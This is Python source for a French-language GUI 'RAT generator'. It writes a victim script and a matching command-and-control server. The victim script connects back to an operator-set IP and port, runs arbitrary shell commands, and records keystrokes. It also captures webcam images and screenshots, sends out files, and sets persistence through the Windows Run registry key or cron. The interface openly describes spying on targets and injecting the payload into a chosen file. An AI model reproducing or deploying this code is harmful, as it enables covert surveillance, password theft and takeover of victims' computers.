import customtkinter as ctk
from tkinter import filedialog, messagebox
import os

def create_victim_script1():
    victim_script_content = """#!/usr/bin/python3

import socket
import subprocess
import time
import os
import sys
import shutil
import platform
import json
import threading
import cv2
import io
import keyboard
import pyautogui
import winreg as reg

time_interval = 10
text = ""

# Configuration de l'environnement selon l'OS
hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")

os.makedirs(hidden_folder, exist_ok=True)  # Creer le repertoire cache s'il n'existe pas

# Fichier de touches
keystroke_file_path = os.path.join(hidden_folder, "keystrokes.txt")

# Variable pour suivre l'etat de l'enregistrement
is_recording = False

#la fonction qui vas envoyer la resultat des commande executer 
def sending(command):
    try:
        json_data = json.dumps(command)
        s.send(json_data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")

#la fonction qui vas recever les commande a executer 
def receive():
    json_data = ""
    while True:
        try:
            chunk = s.recv(4096).decode()
            if not chunk:
                break
            json_data += chunk
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue
        except Exception:
            print(f"Error receiving data: {s}")
            break
    """

    with open("victim.py", "w") as file:
        file.write(victim_script_content)





def add_code_to_victim_script2():
    victim_script_content2 = """
def record_keystrokes():
    global is_recording
    try:
        with open(keystroke_file_path, 'a') as data_file:
            data_file.write(f"Started recording at {time.ctime()}")
            while is_recording:
                # Enregistrer les touches en continu
                events = keyboard.record('enter')  # Enregistrer jusqu'a "enter"
                password = list(keyboard.get_typed_strings(events))
                if password:
                    data_file.write(password[0])  # Sauvegarder les touches dans le fichier
                    data_file.write('')  # Ajouter une nouvelle ligne apres chaque entree
                time.sleep(0.1)  # Petite pause pour ne pas surcharger la CPU
    except Exception as e:
        print(f"Error while recording keystrokes: {str(e)}")

# Fonction pour demarrer l'enregistrement
def start_keylogger():
    global is_recording
    # Reinitialiser le fichier de frappes au debut
    try:
        with open(keystroke_file_path, 'w') as data_file:
            data_file.write("")  # Vider le contenu
    except Exception as e:
        print(f"Error resetting keystroke file: {str(e)}")
    
    is_recording = True
    threading.Thread(target=record_keystrokes, daemon=True).start()

# Fonction pour arreter l'enregistrement
def stop_keylogger():
    global is_recording
    is_recording = False  

# fonction pour le  keylooger
def handle_keylogger_command(command):
    if command.strip() == "keylogger start":
        # Demarrer l'enregistrement des touches
        start_keylogger()
        sending("Keystroke recording started.")
    elif command.strip() == "keylogger stop":
        # Arreter l'enregistrement et envoyer le fichier
        stop_keylogger()
        time.sleep(1)
        send_keystrokes_file()
    else:
        sending(f"Unknown keylogger command: {command}")

def send_keystrokes_file():
    try:
        with open(keystroke_file_path, 'rb') as file:
            file_data = file.read().hex()  # Convertir le fichier en hexadecimal pour l'envoyer   
        sending({"status": "success", "data": file_data})
    except Exception as e:
        sending({"status": "error", "message": str(e)})    

def add_persistence():
    python_path = sys.executable  # Recuperer le chemin vers l'executable Python
    script_path = os.path.abspath("your_script.py")  # Remplacer par le chemin de votre script

    try:
        if platform.system() == "Windows":
            # Ouvrir la cle du registre HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
            
            # Ajouter l'entree pour le script Python
            reg.SetValueEx(registry_key, "MyEmptyKey", 0, reg.REG_SZ, "")

            # Fermer la cle du registre
            reg.CloseKey(registry_key)
        else:
            # Ajouter une tache cron pour Linux
            cron_job = f"@reboot {python_path} {script_path}"
            with open(os.path.expanduser("~/.crontab"), "a") as cron_file:
                cron_file.write(cron_job)

        return "Persistance configuree avec succes ! Le script s'executera au demarrage."

    except Exception as e:
        return f"Erreur lors de la configuration de la persistance : {str(e)}"

# fonction pour prendre une photo de la cible 
def camera_handler():
    try:
        # Ouvrir la camera
        capture = cv2.VideoCapture(0)
        if not capture.isOpened():
            sending("Error: Could not access the camera.")
            return

        # Capturer une seule image
        ret, frame = capture.read()
        if not ret or frame is None:
            sending("Error: Could not capture an image from the camera.")
            capture.release()
            return

        # Encoder l'image en format PNG et convertir en hexadecimal
        success, buffer = cv2.imencode(".png", frame)
        if not success:
            sending("Error: Could not encode the image.")
            capture.release()
            return

        image_data = buffer.tobytes().hex()

        # Envoyer l'image encodee au serveur
        sending({"status": "success", "data": image_data})
    except Exception as e:
        sending(f"Error: {str(e)}")
    finally:
        capture.release()
        cv2.destroyAllWindows()

# fonction pour faire des screenshot de la machine cible 

def screenshot_handler():
    try:
        print("Attempting to capture screenshot...")  # Debug message
        # Capturer une capture d'ecran
        screenshot = pyautogui.screenshot()
        
        # Sauvegarder l'image dans un buffer au format PNG
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        buffer.seek(0)

        # Envoyer les donnees de l'image encodee en hexadecimal
        sending({"status": "success", "data": buffer.getvalue().hex()})
        print("Screenshot captured and sent successfully.")  # Debug message
    except Exception as e:
        print(f"Screenshot capture error: {str(e)}")  # Debug message
        sending({"status": "error", "message": str(e)})

#fonction pour transmetre des fichiers 
def upload_handler(command):
    try:
        # Extraire le nom du fichier et les donnees
        parts = command.split(" ", 2)
        
        if len(parts) < 3:
            sending("Error: Invalid upload command format.")
            return

        filepath = parts[1]
        filedata = parts[2]

        # Recuperer le chemin du bureau de l'utilisateur
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

        # Nom de fichier seulement (sans le chemin d'origine)
        filename = os.path.basename(filepath)

        # Chemin complet du fichier sur le bureau
        target_path = os.path.join(desktop_path, filename)

        # ecrire les donnees dans le fichier
        with open(target_path, "wb") as f:
            f.write(bytes.fromhex(filedata))

        sending(f"File {filename} uploaded successfully to Desktop.")
    except Exception as e:
        sending(f"Error uploading file: {str(e)}")

# fonction pour recuperer des fichiers 
def download_file(command):
    try:
        filepath = command[9:].strip()
        with open(filepath, "rb") as f:
            sending({"status": "success", "data": f.read().hex()})
    except FileNotFoundError:
        sending({"status": "error", "message": "File not found"})
    except Exception as e:
        sending({"status": "error", "message": str(e)})

# fonction des commandes de base 
def handle_command(command):
    if command is None:
        print("Connection closed by the server.")
        return False
    
    # Traitement de la commande quitter le shell
    if command.lower() in ["exit", "quit"]:
        print("Command received to end connection.")
        return False
    
    return True

# fonction les commandes de shell 
def execute_command(command):
    try:
        proc = subprocess.Popen(
            command, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
        )
        result = proc.stdout.read() + proc.stderr.read()
        sending(result.decode('utf-8', errors='replace'))
    except Exception as e:
        sending(f"Error executing command: {str(e)}")

def shell():
    while True:
        try:
            command = receive()
            if not handle_command(command):
                break

"""
    
    with open("victim.py", "a") as file:  # Ouvrir en mode ajout
        file.write(victim_script_content2)


#add code 

def add_code_to_victim_script():
    code_to_add = """
            # Executer toutes les autres commandes
            execute_command(command)

        except socket.error as e:
            print(f"Socket error: {e}")
            break
        except Exception as e:
            print(f"General error: {e}")
            sending(f"Error: {str(e)}")

    print("Exiting shell...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connection()
finally:
    s.close()"""
    
    with open("victim.py", "a") as file:  # Ouvrir en mode ajout
        file.write(code_to_add)


def add_ip_and_port_to_victim_script(ip, port):    
    code_to_add = """
#la fonction qui vas etablire la connectiviter
def connection():
    global s
    while True:
        time.sleep(20)
        try:
            s.connect((ip_address, port))
            shell()
            break  # Exit loop after successful shell session
        except socket.error as e:
            print(f"Connection error: {e}")
            continue  # Retry after sleep interval
        """
    with open("victim.py", "a") as file:  # Ouvrir en mode ajout
        file.write(f"\n")
        file.write(f"port = {port}\n")
        file.write(f"ip_address = \"{ip}\"\n")
        file.write(code_to_add)

def create_server_1():
    code_content = """#!/usr/bin/python3

import platform
import socket
import json
import os
import time

# Create a global variable for the socket and client connection
s = None
target = None
ip = None
reper = os.getcwd()

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
base_dir = os.path.join(desktop_path, "Clients")  # Dossier racine sur le bureau


def create_client_folder(client_ip):
    \"\"\"
    Cree un dossier pour le client base sur son adresse IP.
    \"\"\"
    client_folder = os.path.join(base_dir, client_ip)
    if not os.path.exists(client_folder):
        os.makedirs(os.path.join(client_folder, "screenshots"), exist_ok=True)
        os.makedirs(os.path.join(client_folder, "downloads"), exist_ok=True)
        os.makedirs(os.path.join(client_folder, "keylogger"), exist_ok=True)
    return client_folder



def clear_screen():
    \"\"\"
    Nettoie l'ecran en fonction du systeme d'exploitation.
    \"\"\"
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    
    
def show_help():
    \"\"\"
    Affiche une liste des commandes disponibles.
    \"\"\"
    help_text = \"\"\"
    Liste des commandes disponibles : 
    ---------------------------------
    cd <path>                 : Changer le repertoire sur la machine cible.
    cd                        : Afficher le repertoire courant sur la machine cible.
    (option)download <file>   : Telecharger un fichier depuis la machine cible.
    (option)upload <file>     : Envoyer un fichier vers la machine cible.
    (option)screenshot        : Capturer une capture d'ecran de la machine cible.
    (option)camera            : Capturer une image depuis la webcam de la machine cible.
    (option)keylogger start   : Demarrer l'enregistrement des touches.
    (option)keylogger stop    : Arreter et telecharger les donnees du keylogger.
    (option)persistance       : Configurer la persistance sur la machine cible.
    clear/cls         : Nettoyer l'ecran.
    help              : Afficher cette aide.
    exit/quit         : Quitter la session.
    \"\"\"
    print(help_text)    
#la fonction pour etablire la connexion avec la machine vicitme
def connection():
    global s, target, ip

    # Create a new socket instance
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Configure the socket
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    """

    with open("serve.py", "w") as file:
        file.write(code_content)

def create_server_2(ip, port):    
    code_to_add = """
    # Bind the socket to an IP address and port
    s.bind((ip_address, port))

    # Start listening for incoming connections
    s.listen(5)
    print("Listening for incoming connections...")

    # Accept an incoming connection
    target, ip = s.accept()
    print(f"Connected to {ip}")
    create_client_folder(ip[0]) #creer un dossier pour le client

#la fonction qui vas fair l'envoi des commandes vers la machine de la vicitme
def sending(command):
    # Convert the command to JSON format and send it
    json_data = json.dumps(command)
    target.send(json_data.encode())

#la fonction qui vas recever les resultats des commande executer dans la machine de la vicitme
def receive():
    json_data = ""
    while True:
        try:
            # Receive data from the target in chunks
            chunk = target.recv(4096).decode('utf-8', errors='replace')
            if not chunk:
                break
            json_data += chunk
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue


#la fonction global qui possede les appelles aux fonction declarer dans le haut + possede les fonctionaliter de trojan ...
def shell():
    global reper
    try:
        client_folder = create_client_folder(ip[0])  # Dossier du client connecte
        while True:
            #un simple affichage 
            command = input(f"* Shell#{ip} ==> : ")
            
            #la commande pour quite le shell    
            if command.lower() in ["exit", "quit"]:
                sending(command)
                print("Command received to end connection.")
                break
            
            #la commande pour savoire votre emplacemment dans la machine de la victime    
            elif command.startswith("cd "):  # Gestion des commandes cd
                sending(command)
                response = receive()
                print(response)
                continue
            
            elif command.lower() in ["clear", "cls"]:
                clear_screen()
                continue

            elif command.lower() == "help":
                show_help()
                continue
            
             #la commande pour puise fair changer le repertoire dans la machine de la vicitime   
            elif command.strip() == "cd":  # Verifier le repertoire courant
                sending(command)
                response = receive()  # Recevoir le repertoire courant
                reper=response
                print(f"Current directory: {response}")
                continue
            
            #la commande pour puise fair une capture d'ecran sur la machine de ma vicitme
            elif command.strip() == "screenshot":
                sending(command)
                response = receive()
                if response.get("status") == "success":
                    try:
                        screenshot_data = response.get("data")
                        if not screenshot_data:
                            print("No screenshot data received.")
                            continue
                        # Chemin de sauvegarde
                        screenshot_path = os.path.join(client_folder ,"screenshots", f"{ip}_ScreenShot.png")
                        with open(screenshot_path, "wb") as f:
                            f.write(bytes.fromhex(screenshot_data))
                        print(f"Screenshot saved successfully at {screenshot_path}.")
                    except Exception as e:
                        print(f"Error saving screenshot: {str(e)}")
                else:
                    print(f"Error taking screenshot: {response.get('message')}")
                continue

            
            #la commande pour puisse telecharger des fichier ou des dossier depuis la machine de la vicitme
            elif command.startswith("download "):
                sending(command)
                response = receive()

                # Chemin de stockage

                if response.get("status") == "success":
                    # Extraire le nom du fichier demande
                    filename = os.path.basename(command[9:].strip())
                    filepath = os.path.join(client_folder,"downloads", filename)

                # Sauvegarder le fichier directement dans le repertoire Downloads
                    with open(filepath, "wb") as f:
                        f.write(bytes.fromhex(response["data"]))
        
                    print(f"File downloaded successfully: {filepath}")
                else:
                    print(f"Error downloading file: {response.get('message')}")
                continue
            
           #la commande pour puise uploader des fichier dans la machine de vicitime 
            elif command.startswith("upload "):
                try:
                # Recuperer le chemin specifie par l'utilisateur
                    filepath = command.split(" ", 1)[1]
        
                # Ajouter le repertoire courant s'il s'agit d'un chemin relatif
                    if not os.path.isabs(filepath):
                        filepath = os.path.join(reper, filepath)
                    else: 
                        filepath = filename
                # Debug : Afficher le chemin reel utilise
                    print(f"Attempting to upload file from: {filepath}")
        
                # Verifier si le fichier existe
                    if not os.path.exists(filepath):
                        print(f"File '{filepath}' does not exist.")
                        continue
        
        # Lire le fichier
                    with open(filepath, "rb") as f:
                        filedata = f.read().hex()
        
                    # Envoyer au client
                    sending(f"upload {filepath} {filedata}")
                    response = receive()
                    print(response)
                except Exception as e:
                    print(f"Error uploading file: {str(e)}")
                continue
            
            if command.strip() == "camera":
                sending(command)  # Envoyer la commande au client
                response = receive()  # Recevoir la reponse du client
                if isinstance(response, dict) and response.get("status") == "success":
                    # Recuperer les donnees de l'image
                    image_data = bytes.fromhex(response.get("data"))
        
                    # Chemin de sauvegarde dans le dossier du client
                    image_folder = os.path.join(client_folder, "screenshots")
                    os.makedirs(image_folder, exist_ok=True)  # S'assurer que le dossier existe

                    # Nommer le fichier en fonction de l'heure pour eviter les conflits
                    image_path = os.path.join(image_folder, f"camera_image_{time.strftime('%Y%m%d_%H%M%S')}.png")
        
                    # Enregistrer l'image capturee
                    with open(image_path, "wb") as f:
                        f.write(image_data)

                    print(f"Image successfully saved at: {image_path}")
                else:
                    print(f"Failed to capture image: {response}")
                continue

            
            elif command.strip() == "keylogger start":
                # Envoi de la commande pour demarrer l'enregistrement des touches
                sending(command)
                response = receive()  # Reponse du client
                print(response)  # Afficher le message de statut
                continue
            
            elif command.strip() == "keylogger stop":
                sending(command)
                response = receive()
                if response.get("status") == "success":
                    keystrokes_path = os.path.join(client_folder, "keylogger", "keystrokes.txt")
                    with open(keystrokes_path, "wb") as f:
                        f.write(bytes.fromhex(response["data"]))
                    print(f"Keystrokes file saved at: {keystrokes_path}")
                else:
                    print(f"Failed to receive keystrokes file: {response.get('message')}")
            
            # Code cote serveur pour envoyer la commande persistance
            elif command.strip() == "persistance":
                sending(command)  # Envoyer la commande au client pour qu'il configure la persistance
                response = receive()  # Attendre la reponse du client (statut)
                print(response)  # Afficher si la persistance a etee configuree avec succes
                continue




            # Envoyer d'autres commandes au client
            sending(command)
            response = receive()
            print(response)

    except KeyboardInterrupt:
        print("Interruption by user!")



# le main
if __name__ == "__main__":
    try:
        connection()
        shell()
    finally:
        # Ensure the socket and connection are properly closed
        if target:
            target.close()
        if s:
            s.close()
        """
    with open("serve.py", "a") as file:  # Ouvrir en mode ajout
        file.write(f"\n")
        file.write(f"    port = {port}\n")
        file.write(f"    ip_address = \"{ip}\"")
        file.write(code_to_add)

#handel
def handle_button_click(self):
        # Appeler la methode save_and_next
        self.save_and_next()
        # Appeler la methode add_code_to_victim_script
        self.add_code_to_victim_script()


# ajouter le code keylogger dans le code victim 

def add_keylogger_code_to_victim_script(self):
        keylogger_code = """
           elif command.startswith("keylogger"):
                handle_keylogger_command(command)
                continue
"""
        # Ajouter le code dans le fichier victim.py
        with open("victim.py", "a") as file:
            file.write(keylogger_code)
        print("Code du keylogger ajoute dans victim.py")
    

# Configuration globale pour un design moderne
ctk.set_appearance_mode("dark")  # Thème sombre
ctk.set_default_color_theme("blue")  # Palette de couleurs modernes

class Application(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Genérateur de RAT - Interface Professionnelle")
        self.geometry("600x600")  # Taille augmentée pour plus d'espace visuel
        self.resizable(False, False)  # Empêche le redimensionnement pour préserver le design
        self.user_choices = {
            "options": [],
            "file_to_inject": None,
            "extension": ".exe",
            "output_path": None,
            "ip_address": "127.0.0.1",
            "port": 8080,
            "encryption_method": "AES"
        }

        # Configuration principale pour que tout le contenu s'étende
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        # Conteneur principal
        self.container = ctk.CTkFrame(self, corner_radius=10)
        self.container.grid(row=0, column=0)

        # Initialisation des pages
        self.pages = {}
        for Page in (IntroductionPage, OptionsPage, FileSelectionPage, NetworkSettingsPage, OutputPage):
            page_name = Page.__name__
            page = Page(parent=self.container, controller=self)
            self.pages[page_name] = page
            page.grid(row=0, column=0, sticky="nsew")

        self.show_page("IntroductionPage")

    def show_page(self, page_name):
        """Afficher une page spécifique."""
        page = self.pages[page_name]
        page.tkraise()

class CenteredFrame(ctk.CTkFrame):
    """Cadre professionnel avec un design soigné."""
    def __init__(self, parent, **kwargs):
        super().__init__(parent, **kwargs)
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        self.inner_frame = ctk.CTkFrame(self, corner_radius=15)
        self.inner_frame.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")

class IntroductionPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Bienvenue dans le Générateur de RAT",
                     font=("Arial", 28, "bold"), text_color="lightblue").pack(pady=20)

        ctk.CTkLabel(self.inner_frame, text="Créez un RAT personnalisé avec des fonctionnalités avancées\n"
                                            "et injectez-le dans un fichier cible.",
                     font=("Arial", 18), justify="center").pack(pady=20)

        # Code pour afficher la page OptionsPage
        ctk.CTkButton(self.inner_frame, text="Commencer",
                font=("Arial", 18), corner_radius=10,
                command=lambda: controller.show_page("NetworkSettingsPage")).pack(pady=30)

class OptionsPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Options du RAT",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        ip_address = self.controller.user_choices.get("ip_address")
        port = self.controller.user_choices.get("port")
        # Description et liste d'options avec des cases à cocher
        self.options = {
            "Keylogger": "Enregistre toutes les frappes du clavier.",
            "Ouvrir la webcam": "Active la webcam pour espionner.",
            "Capture d'écran": "Prend des captures d'écran à intervalles réguliers.",
            "Récupération des fichiers": "Télécharge les fichiers spécifiques depuis la cible.",
            "Transmettre des fichiers": "Permet d'envoyer des fichiers vers la cible.",
            "Persistance": "Implémente la persistance pour maintenir l'accès.",
            "Surveillance du microphone": "Écoute via le microphone.",
            
        }

        self.selected_options = {}
        for option, description in self.options.items():
            var = ctk.BooleanVar()
            checkbox = ctk.CTkCheckBox(self.inner_frame, text=option, variable=var,
                                       font=("Arial", 14), text_color="white",
                                       command=lambda o=option, d=description: self.show_description(o, d))
            checkbox.pack(anchor="w", pady=5)
            self.selected_options[option] = var

        self.description_label = ctk.CTkLabel(self.inner_frame, text="Sélectionnez une option pour voir sa description.",
                                              font=("Arial", 14), text_color="gray")
        self.description_label.pack(pady=15)

        # Boutons de navigation
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(fill="x", pady=20)

        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                      command=lambda: controller.show_page("NetworkSettingsPage")).pack(side="left", padx=10)

        # Créer un bouton qui appelle la méthode handle_button_click
        ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
                      command=lambda:[self.save_and_create_file(), controller.show_page("FileSelectionPage") ]).pack(side="right", padx=20)

    def show_description(self, option, description):
        """Affiche la description de l'option sélectionnée."""
        self.description_label.configure(text=f"{option} : {description}")

        
    def save_and_create_file(self):
        selected = [option for option, var in self.selected_options.items() if var.get()]
        if not selected:
            messagebox.showwarning("Avertissement", "Veuillez sélectionner au moins une option.")
            return
        create_victim_script1()
        NetworkSettingsPage.recup_ip_port(self.controller.user_choices)
        add_code_to_victim_script2()
        # Ajouter le code correspondant aux options sélectionnées dans victim.py
        for option in selected:
            if option == "Keylogger":
                self.add_keylogger_code_to_victim_script()
            elif option == "Ouvrir la webcam":
                self.add_camera_code_to_victim_script()
            elif option == "Capture d'écran":
                self.add_screenshot_code_to_victim_script()
            elif option == "Récupération des fichiers":
                self.add_download_code_to_victim_script()
            elif option == "Transmettre des fichiers":
                self.add_upload_code_to_victim_script()
            elif option == "Persistance":
                self.add_persistence_code_to_victim_script()
        add_code_to_victim_script()
        create_server_1()
        NetworkSettingsPage.recup_ip_port2(self.controller.user_choices)
        self.controller.user_choices["options"] = selected
    
    def add_keylogger_code_to_victim_script(self):
        keylogger_code = """
            elif command.startswith("keylogger"):
                handle_keylogger_command(command)
                continue
            """
        self.append_code_to_victim_script(keylogger_code)
    
    def add_camera_code_to_victim_script(self):
        """
        Ajouter le code pour activer la webcam dans victim.py.
        """
        camera_code = """
            elif command.strip() == "camera":
                camera_handler()
                continue
            """
        self.append_code_to_victim_script(camera_code)
    
    def add_screenshot_code_to_victim_script(self):
        screenshot_code = """
            elif command.strip() == "screenshot":
                screenshot_handler()
                continue
            """
        self.append_code_to_victim_script(screenshot_code)


    def add_download_code_to_victim_script(self):
        download_code = """
            elif command.startswith("download "):
                download_file(command)
                continue
            """
        self.append_code_to_victim_script(download_code)


    def add_persistence_code_to_victim_script(self):
        persistence_code = """
            elif command.strip() == "persistence":
                response = add_persistence()
                sending(response)
                continue
            """
        self.append_code_to_victim_script(persistence_code)

    def add_upload_code_to_victim_script(self):
        upload_code = """
            elif command.startswith("upload "):
                upload_handler(command)
                continue
            """
        self.append_code_to_victim_script(upload_code)


    def append_code_to_victim_script(self, code):
        """
        Ajouter un bloc de code dans le fichier victim.py.
        """
        with open("victim.py", "a") as file:
            file.write(code)
        

class FileSelectionPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Sélectionner un fichier pour l'injection",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        self.file_label = ctk.CTkLabel(self.inner_frame, text="Aucun fichier sélectionné",
                                       font=("Arial", 16), text_color="gray")
        self.file_label.pack(pady=10)

        # Menu déroulant et bouton pour sélectionner un fichier
        ctk.CTkLabel(self.inner_frame, text="Choisir l'extension :", font=("Arial", 14)).pack(pady=10)
        

        ctk.CTkButton(self.inner_frame, text="Choisir un fichier", font=("Arial", 16),
                      command=self.choose_file).pack(pady=10)

        # Boutons de navigation
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(fill="x", pady=20)

        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                      command=lambda: controller.show_page("OptionsPage")).pack(side="left", padx=10)

        ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
                      command=lambda: controller.show_page("OutputPage")).pack(side="right", padx=10)


    def choose_file(self):
        file_path = filedialog.askopenfilename(title="Choisir un fichier")
        if file_path:
            self.controller.user_choices["file_to_inject"] = file_path
            self.file_label.configure(text=f"Fichier sélectionné : {file_path}", text_color="white")



class NetworkSettingsPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Paramètres Réseau",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        # Adresse IP
        ctk.CTkLabel(self.inner_frame, text="Adresse IP :", font=("Arial", 14)).pack(pady=5)
        self.ip_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="127.0.0.1")
        self.ip_entry.insert(0, self.controller.user_choices["ip_address"])
        self.ip_entry.pack(pady=5)

        # Port
        ctk.CTkLabel(self.inner_frame, text="Port :", font=("Arial", 14)).pack(pady=5)
        self.port_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="8080")
        self.port_entry.insert(0, str(self.controller.user_choices["port"]))
        self.port_entry.pack(pady=5)

       
       
        # Boutons de navigation
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(fill="x", pady=20)

        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                      command=lambda: controller.show_page("IntroductionPage")).pack(side="left", padx=10)

        ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
                      command=self.save_and_next).pack(side="right", padx=10)

    def select_encryption(self, method):
        self.controller.user_choices["encryption_method"] = method

    def save_and_next(self):
        self.controller.user_choices["ip_address"] = self.ip_entry.get()
        self.controller.user_choices["port"] = int(self.port_entry.get())
        self.controller.show_page("OptionsPage")
        
    @staticmethod
    def recup_ip_port(controller_user_choices):
        ip_address = controller_user_choices.get("ip_address")
        port = controller_user_choices.get("port")
        
        if ip_address and port:
            add_ip_and_port_to_victim_script(ip_address, port)
        else:
            print("IP ou Port non définis.")
        
    @staticmethod
    def recup_ip_port2(controller_user_choices):
        ip_address = controller_user_choices.get("ip_address")
        port = controller_user_choices.get("port")
        
        if ip_address and port:
            create_server_2(ip_address, port)
        else:
            print("IP ou Port non définis.")


class OutputPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Emplacement de stockage",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        self.output_label = ctk.CTkLabel(self.inner_frame, text="Aucun emplacement sélectionné",
                                         font=("Arial", 16), text_color="gray")
        self.output_label.pack(pady=10)

        ctk.CTkButton(self.inner_frame, text="Choisir un emplacement", font=("Arial", 16),
                      command=self.choose_output).pack(pady=10)

        # Boutons de navigation
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(fill="x", pady=20)

        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                      command=lambda: controller.show_page("FileSelectionPage")).pack(side="left", padx=10)

        ctk.CTkButton(button_frame, text="Générer", font=("Arial", 16),
                      command=self.generate_rat).pack(side="right", padx=10)

    def choose_output(self):
        output_path = filedialog.askdirectory(title="Choisir un emplacement de stockage")
        if output_path:
            self.controller.user_choices["output_path"] = output_path
            self.output_label.configure(text=f"Emplacement sélectionné : {output_path}", text_color="white")

    def generate_rat(self):
        if not self.controller.user_choices["output_path"]:
            messagebox.showwarning("Avertissement", "Veuillez sélectionner un emplacement de stockage.")
            return

        options = ", ".join(self.controller.user_choices["options"])
        file_to_inject = self.controller.user_choices["file_to_inject"]
        extension = self.controller.user_choices["extension"]
        output_path = self.controller.user_choices["output_path"]
        ip_address = self.controller.user_choices["ip_address"]
        port = self.controller.user_choices["port"]
        encryption_method = self.controller.user_choices["encryption_method"]

        messagebox.showinfo(
            "Succès",
            f"RAT généré avec succès !\n\nOptions : {options}\nExtension : {extension}\n"
            f"Fichier injecté : {file_to_inject}\nIP : {ip_address}\nPort : {port}\n"
            f"Méthode de chiffrement : {encryption_method}\nStocké dans : {output_path}"
        )

if __name__ == "__main__":
    app = Application()
    app.mainloop()
